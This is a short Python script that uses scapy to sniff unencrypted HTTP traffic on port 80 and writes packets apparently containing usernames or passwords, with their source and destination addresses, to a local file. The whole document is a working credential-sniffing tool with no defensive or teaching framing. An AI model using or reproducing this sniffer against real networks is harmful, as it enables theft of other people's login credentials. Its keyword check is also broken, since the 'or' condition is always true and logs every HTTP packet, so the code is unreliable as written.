from scapy.all import *


#sniff(filter="",iface='any',prn=function,count=N)

def getHttpHeaders(http_payload):
    try:
        headers=dict(re.findall(r'\r\n([A-Za-z]{2,}.*?\w): (.*?)\r\n',http_payload))
        if headers=={}:
            return None
    except:
        return None
    return headers

def getUser(packet):
    f=open('userdata.txt','a')
    f.write("[*]Dst:{}".format(packet[IP].dst)+'\n')
    f.write('[*]Src:%s'%packet[IP].src+'\n')
    f.write("[*]Data:{}".format(packet[IP].payload)+'\n\n\n')
    f.close()

def packet_callback(packet):
    if packet[TCP].payload:
        data=packet[TCP].load.decode('utf-8','ignore')
        headers=getHttpHeaders(data)
        if headers==None:
            return
        passwd_packet=str(packet[TCP].payload)
        if  'password' or 'passwd' or 'username' in passwd_packet.lower():
            getUser(packet)


packets=sniff(filter='tcp port 80',prn=packet_callback,count=100000)
